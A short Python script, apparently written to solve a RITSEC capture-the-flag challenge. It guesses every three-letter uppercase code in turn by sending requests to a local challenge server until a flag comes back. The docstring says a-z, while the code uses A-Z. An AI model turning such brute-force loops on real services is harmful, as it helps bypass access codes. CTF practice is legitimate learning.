'''
code to send a 3 letter code (a-z) to a web server to solve a RITSEC challenge
'''

import time
import requests

CURRENT_CODE = "AAA"


def increment_code():
    '''
    increments the current code (AAA->AAB->AAC, etc)
    '''
    global CURRENT_CODE
    # string to list of 1 character strings
    chars = [*CURRENT_CODE]

    # change all to ints as per ascii table
    index = 0
    for char in chars:
        value = ord(char)
        chars[index] = value
        index += 1

    # this code is probably not as efficient as it could be
    # if last character is 90, then reset it and increment the middle character
    if chars[2] == 90:
        chars[2] = 65
        # same with middle character -> first character
        if chars[1] == 90:
            chars[1] = 65
            # if all characters are Z, then we didnt' find the code
            if chars[0] == 90:
                print("code not found.")
                exit()
            else:
                chars[0] += 1
        else:
            chars[1] += 1
    else:
        chars[2] += 1
    # convert back to letters
    index = 0
    for char in chars:
        value = chr(char)
        chars[index] = value
        index += 1
    # convert back to one solid string
    CURRENT_CODE = "".join(chars)


data = requests.get("http://localhost:9888/med1/{0}".format(CURRENT_CODE))
print("trying code {0}".format(CURRENT_CODE))

while data.json()["flag"] == "NotFound":
    increment_code()
    print("trying code {0}".format(CURRENT_CODE))
    data = requests.get("http://localhost:9888/med1/{0}".format(CURRENT_CODE))

print(data.json()["flag"])


# while data.json()["flag"] == "NotFound":
